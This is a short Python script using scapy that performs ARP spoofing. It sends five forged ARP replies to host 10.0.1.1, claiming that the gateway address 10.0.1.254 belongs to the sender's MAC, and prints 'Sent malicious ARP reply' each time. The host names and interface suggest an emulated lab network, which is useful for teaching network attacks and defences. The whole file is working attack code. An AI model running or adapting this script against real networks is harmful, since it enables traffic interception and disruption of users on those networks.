from scapy.all import Ether, ARP, sendp
import time
import sys

def spoof():
    # m1's MAC address is 00:00:00:00:01:02
    my_mac = "00:00:00:00:01:02"
    # Target: h1 (10.0.1.1)
    target_ip = "10.0.1.1"
    target_mac = "00:00:00:00:01:01"
    # Gateway IP (who we are pretending to be)
    gateway_ip = "10.0.1.254"

    print(f"Starting ARP spoof on {target_ip} pretending to be {gateway_ip}")
    packet = Ether(src=my_mac, dst=target_mac)/ARP(op=2, psrc=gateway_ip, hwsrc=my_mac, pdst=target_ip, hwdst=target_mac)
    
    for i in range(5):
        sendp(packet, iface="m1-eth0", verbose=False)
        print("Sent malicious ARP reply")
        time.sleep(1)

if __name__ == '__main__':
    spoof()
